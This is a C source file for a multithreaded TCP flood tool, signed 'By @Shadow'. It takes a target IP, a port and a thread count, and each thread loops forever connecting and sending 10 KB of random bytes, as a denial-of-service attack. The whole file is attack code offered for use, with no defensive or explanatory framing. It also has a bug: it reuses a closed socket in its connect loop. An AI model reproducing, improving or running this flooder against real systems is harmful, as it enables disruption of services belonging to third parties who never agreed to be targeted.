#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./tcp_flood <ip> <port> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Complex payload filled with random data
    char payload[1024 * 10]; // 10 KB payload
    for (int i = 0; i < sizeof(payload) - 1; i++) {
        payload[i] = (char)(rand() % 256); // Fill with random bytes
    }
    //payload[sizeof(payload) - 1] = '\0'; // Null-terminate for safety

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Attempt to connect repeatedly
    while (1) {
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Connection failed, can print error if needed
        } else {
            // Send payload once connected
            send(sock, payload, sizeof(payload), 0);
            close(sock); // Close connection after sending
        }
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port};

    printf("Flood started on %s:%d with %d threads\n", ip, port, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        //printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    printf("By @Shadow");
    return 0;
}
